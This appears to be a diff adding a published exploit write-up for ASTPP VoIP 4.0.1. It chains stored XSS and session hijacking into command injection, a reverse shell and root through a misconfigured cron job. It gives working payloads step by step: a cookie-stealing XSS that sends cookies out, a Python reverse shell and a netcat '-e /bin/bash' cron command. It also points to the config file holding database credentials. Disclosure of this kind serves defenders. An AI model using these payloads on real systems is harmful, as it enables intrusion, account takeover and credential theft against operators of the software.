@@ -1,0 +1,72 @@
+# Exploit Title: ASTPP VoIP 4.0.1 - Remote Code Execution
+# Date: 2019-11-18
+# Exploit Author: Fabien AUNAY
+# Vendor Homepage: https://www.astppbilling.org/
+# Software Link: https://github.com/iNextrix/ASTPP/tree/v4.0.1
+# Version: 4.0.1 vendor default setup script
+# Tested on: Debian 9 - CentOS 7
+# CVE : -
+
+###########################################################################################################
+ASTPP 4.0.1 VoIP Billing Chained Remote Root
+A Smart TelePhony Platform for Individual Business, Wholesale and Residential VoIP Service Providers!
+It is available as an open source solution. It means without any investment, one can start his telephony
+business using ASTPP.
+ASTPP, being one of the most powerful VoIP Billing Software, thrives to benefit its users by providing a
+comprehensive telephony solution. This open source solution has lifted itself up from a mere VoIP billing
+solution to “A Smart TelePhony Platform”.
+The latest version of ASTPP is provisioned with some advanced functional modules which are designed
+to eliminate the need of multiple solutions to run a VoIP business. It has integrated hosted IP PBX, Class
+4/5 Softswitch, and complete invoicing and billing solution developed by leveraging Smart
+Technology.
+
+Steps are as follows:
+Objective 1 : Edit the SIP device and try to test user inputs
+Objective 2 : Try to trigger a XSS
+Objective 3 : Try to evade filters
+Objective 4 : Session Hijack
+Objective 5 : Plugin command injection
+Objective 6 : Reverse shell
+Objective 7 : Root the system
+Objective 8 : Looting
+
+###########################################################################################################
+
+Objective 1 : html code in SIP Caller Number
+POC: <b>ASTPP html test</b>
+
+Objective 2 : XSS injection in SIP Caller Name
+POC: <svg/onload=alert('XsS-Inj3cTIoN')>
+
+Objective 3 : XSS document.cookie evasion
+POC: <svg/onload=alert(document/*foo*/./*bar*/cookie)>
+
+Objective 4 : XSS document.cookie grabber
+POC: <svg/onload=window.open("http://127.0.0.1:8080/?"+document/*foo*/./*bar*/cookie)>
+
+Alternative : if the user input is limited, it is possible in some cases to modify the length with the inspector
+POC: <input data-ripple="" type="text" name="name" value="1" placeholder="" size="20" maxlength="30" class="col-md-12 form-control form-control-lg">
+POC': <input data-ripple="" type="text" name="name" value="1" placeholder="" size="20" maxlength="250" class="col-md-12 form-control form-control-lg">
+
+Objective 5 : Plugin command injection
+After administrator cookie and session hijack, it is possible to install some stuff. ASTPP allows one of the best to perform a system command injection.
+The get addons sub menu, allow attacker to install “Switch Monitoring”. Use the system command followed by your instructions and press 'Submit'
+POC : system date;id;whoami
+
+Objective 6 : Reverse shell
+POC: system python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Objective 7 : Root the system
+A vulnerability was identified in web Crons menu. The cron task was executed with root permissions due to a wrong configuration of the installation script.
+Before use it, you should step back to your reverse shell and check the date of the server.
+
+POC:
+Name: Exploit cron
+Command: nc 127.0.0.1 8080 -e /bin/bash
+Interval Type: Minute
+Interval: 1
+Next Execution Date: xxxx-xx-xx yy:yy:yy
+Status: Active
+
+Objective 8 : Looting
+The /var/lib/astpp/astpp-config.conf file contains all information to explore the database.
